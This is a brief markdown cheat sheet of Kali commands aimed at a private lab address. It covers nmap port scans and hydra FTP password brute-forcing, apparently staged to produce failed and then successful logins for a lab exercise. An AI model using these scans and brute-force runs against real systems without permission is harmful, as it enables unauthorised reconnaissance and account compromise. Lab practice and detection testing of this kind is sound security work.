# Kali Attack Commands

## Web Hit
```bash
curl http://192.168.1.18
```

## FTP Login Test

```bash
ftp 192.168.1.18
```

## SYN Scan

```bash
sudo nmap -sS -Pn -p 1-100 192.168.1.18
```

## TCP Scan

```bash
nmap -sT -Pn -p 1-100 192.168.1.18
```

## UDP Scan

```bash
sudo nmap -sU -Pn --top-ports 10 192.168.1.18
```

## Targeted TCP Scan

```bash
nmap -Pn -p 21,80,135,139,445,5985 192.168.1.18
```

## Failed FTP Brute Force

Create the file:

```bash
nano ftp_bad.txt
```

Example contents:

```
wrong1
wrong2
wrong3
wrong4
wrong5
wrong6
```

Run:

```bash
hydra -l ftpuser -P ftp_bad.txt ftp://192.168.1.18
```

## FTP Success After Failures

Create the file:

```bash
nano ftp_mixed.txt
```

Example contents:

```
wrong1
wrong2
wrong3
wrong4
wrong5
YourRealPasswordHere
```

Run:

```bash
hydra -l ftpuser -P ftp_mixed.txt ftp://192.168.1.18
```